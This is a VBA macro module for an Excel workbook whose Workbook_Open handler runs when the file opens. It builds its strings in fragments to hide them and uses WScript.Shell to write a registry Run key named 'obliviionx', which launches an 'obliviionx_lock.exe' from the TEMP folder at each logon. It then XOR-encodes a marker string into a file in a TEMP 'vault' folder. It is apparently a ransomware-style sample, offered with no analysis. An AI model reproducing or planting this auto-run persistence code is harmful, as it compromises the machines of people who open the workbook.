Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim ws As Object
    Dim fPath As String, data As String, enc As String
    Dim i As Long
    Set ws = CreateObject("WScrip" & "t.Sh" & "ell")
    ws.RegWrite "HKCU\Soft" & "ware\Mic" & "rosoft\W" & "indows\Cu" & "rrent" & "Version\" & "Run\" & "oblivi" & "onx", """ & Environ("TEMP") & "\oblivi" & "onx_lock" & ".exe"", "REG_SZ"
    fPath = Environ("TEMP") & "\obl" & "ivion" & "x_vaul" & "t\secret" & ".txt"
    data = "top secre" & "t ma" & "rker dat" & "a"
    enc = ""
    For i = 1 To Len(data)
        enc = enc & Chr(Asc(Mid(data, i, 1)) Xor 42)
    Next i
    Open fPath For Output As #1
    Print #1, enc
    Close #1
End Sub
